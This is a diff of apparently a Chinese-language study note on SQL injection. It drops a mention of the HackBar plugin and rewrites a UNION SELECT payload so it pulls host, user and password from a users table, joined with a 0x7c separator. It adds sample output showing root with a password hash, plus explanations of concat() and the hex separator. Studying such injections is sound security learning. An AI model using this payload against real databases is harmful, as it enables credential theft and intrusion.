@@ -31,10 +31,6 @@ Havij
 
 
 ----------
-> 插件:HackBar
-
-
-----------
 
 
 > --’
@@ -79,11 +75,13 @@ Havij
 
 ----------
 
-> ' union select password, concat(first_name,' ',last_name, ' ',user)
+> ' union select password, concat(host,0x7c,user,0x7c,password)
 > from users --' 
 > 用concat()函数将所有信息都列出来：
 
-
+localhost|root|*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+> `concat()`函数把多个需要查询的字段放在一起
+> `0x7c`是`|`符号的16进制转码结果，有利于我们到时候把字段区分开。
 ----------
 
 
